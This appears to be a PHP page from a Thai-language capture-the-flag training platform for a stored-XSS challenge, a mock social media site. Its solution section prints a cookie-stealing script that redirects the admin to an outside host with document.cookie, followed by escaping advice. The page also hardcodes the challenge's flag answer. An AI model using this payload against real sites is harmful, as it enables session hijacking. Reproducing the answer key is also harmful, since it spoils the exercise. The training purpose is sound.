<?php $page = 'ch10';?>
<?php
        if(isset($_POST["en_pass"])){
        $flag = $_POST["en_pass"];
            if($flag == "flag{F4k3Bo0k_1s_Not_Fac3B0ok}"){
                $isPass = true;
                $ch = 10;
                require_once('database/setState.php');
            }
            else {
                $isPass = false;
            }
        }
?>
<?php require_once('header.php') ?>
<?php require_once('header_home.php') ?>
    <div class="bg-main">
        <div class="content-wrapper mx-0">
            <div class="content-banner">
                <div class="header-score">
                    <div>
                        <h1>Cross Site Scripting (XSS)&nbsp;<span>(200 points)</span></h1>
                        <h4>The Social Media</h4>
                    </div>
                </div>
                <div class="detail-cha mt-5">
                    <div class="description">
                        <h5>Description</h5>
                        <p>ท่านได้รับคำสั่งให้มาทำการทดสอบเจาะระบบ Social Media เจ้าหนึ่งที่กำลังอยู่ในช่วงทดสอบระบบ Post ข้อความ โดยเว็บนี้จะมี Admin คอยเข้ามาดูแลความเรียบร้อยของระบบทุก ๆ 1 นาที ภารกิจของท่าน คือการขโมย Cookie ของ Admin คนนั้นมาให้ได้ !!</p>
                    </div>
                    <div>
                        <h5>Goal</h5>
                        <p>ขโมย Cookie ของ Admin ระบบนี้</p>
                        <a href="ch10/fakebook.php" target="_blank" class="btn btn-primary" role="button">Start the Lab</a>            
                    </div>
                    <div>
                        <h5>Validation</h5>
                        <?php
                            if(isset($isPass)){
                                if($isPass){
                                    echo '<div class="alert alert-success">Well Done!</div>';
                                }
                                else {
                                    echo'<div class="alert alert-danger">Nahh Try it again.</div>';
                                }
                            }
                        ?>
                        <form action="" method="POST">
                            <label for="en_pass">Enter flag :</label>
                            <input type="text" name="en_pass">
                            <button type="submit">Send</button>
                        </form>
                    </div>
                    <div>
                        <h5>Related ressource(s)</h5>
                        <ul class="resource"> 
                            <li><a target="_blank" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-site Scripting (XSS)</a></li>
                            <li><a target="_blank" href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">Testing for Stored Cross site scripting</a></li>
                        </ul>
                    </div>
                    <div>
                        <ul class="accordion" id="investAccordion">
                            <li>
                                <h5 class="invest-collapse collapsed" id="headingOne" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">Hint</h5>
                                <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#investAccordion">
                                - ทำให้ admin ส่ง Cookie ของเขามาเว็บเราผ่านทาง URL โดยใช้ JS ดูสิ !
                                </div>    
                            </li>
                            <li>
                                <h5 class="invest-collapse collapsed" id="headingTwo" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">Solution</h5>
                                <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#investAccordion">  
                                     <!-- Button trigger modal -->
                                     <button type="button" class="solution btn btn-primary" data-toggle="modal" data-target="#exampleModalLong">
                                    Are you sure ?
                                    </button>
                                    <!-- Modal -->
                                    <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
                                        <div class="modal-dialog" role="document">
                                            <div class="modal-content">
                                                <div class="modal-body m-3 pb-0">
                                                    <h5 class="mb-2">Solution</h5>
                                                    - เป้าหมายของข้อนี้คือการขโมย Cookie ของ admin ให้ได้ ซึ่งหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึี่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้นทำได้หลากหลายท่า เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้<br><br>
                                                    &lt;script&gt;<br>
                                                    <div class="ml-4 mb-0">window.location = &quot;http://www.mysite.com/&quot; + document.cookie;</div>
                                                    &lt;/script&gt;<br><br>
                                                    รอสักครู่แล้วไปดู log flag ซึ่งอยู่ใน Cookie ก็จะติดมากับ request นั้นๆ เป็นอันจบ เย่
                                                    <h5 class="mt-3 mb-2">Recommendation</h5>
                                                    - วิธีแก้ XSS ก็คือ ทำการ Escape special character ทุก ๆ ครั้งที่มีการแสดง หรือสามารถ Escape character ตั้งแต่กระบวนการ insert ข้อมูลลงใน database ก็ทำได้เช่นเดียวกัน<br>
                                                    ref : <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a> 
                                                </div>
                                                <div class="modal-footer mt-0 pt-2 px-4">
                                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>    
                            </li>
                        </ul>                        
                    </div>
                </div>
            </div>    
        </div>
    </div>
</div>  <!-- for nav-bar -->